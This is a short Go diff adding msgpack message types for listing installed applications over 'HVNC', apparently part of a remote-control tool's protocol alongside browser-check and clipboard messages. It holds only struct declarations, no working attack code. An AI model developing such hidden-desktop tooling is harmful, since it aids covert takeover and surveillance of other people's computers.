@@ -252,6 +252,18 @@ type HVNCBrowserCheckResult struct {
 	Browsers map[string]bool `msgpack:"browsers"`
 }
 
+type HVNCInstalledApp struct {
+	Name    string `msgpack:"name"`
+	ExePath string `msgpack:"exePath"`
+	Icon    string `msgpack:"icon"`
+}
+
+type HVNCInstalledAppsResult struct {
+	Type string             `msgpack:"type"`
+	Apps []HVNCInstalledApp `msgpack:"apps"`
+	Done bool               `msgpack:"done"`
+}
+
 type ClipboardContent struct {
 	Type   string `msgpack:"type"`
 	Text   string `msgpack:"text"`
